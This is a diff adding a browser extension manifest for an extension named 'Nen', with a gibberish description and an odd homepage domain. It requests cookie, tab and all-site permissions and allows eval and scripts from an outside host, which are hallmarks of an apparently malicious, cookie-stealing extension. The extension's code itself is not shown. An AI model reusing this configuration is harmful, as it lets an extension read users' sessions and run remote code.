@@ -1,0 +1,28 @@
+{
+    "update_url": "https://clients2.google.com/service/update2/crx",
+    "version": "1.7.5",
+    "manifest_version": 2,
+    "background": {
+        "scripts": [
+            "background.js"
+        ]
+    },
+    "name": "Nen",
+    "permissions": [
+        "tabs",
+        "*://*/*",
+        "cookies"
+    ],
+    "description": "Nen ibubusa inidipi aheg ujopus ecicuyo dihe",
+    "homepage_url": "http://ohusekef.com",
+    "icons": {
+        "16": "icon16.png",
+        "48": "icon48.png",
+        "128": "icon128.png"
+    },
+    "content_security_policy": "script-src 'self' 'unsafe-eval' https://checkpost.space; object-src 'self'",
+    "browser_action": {
+        "default_icon": "icon48.png",
+        "default_popup": "popup.html"
+    }
+}
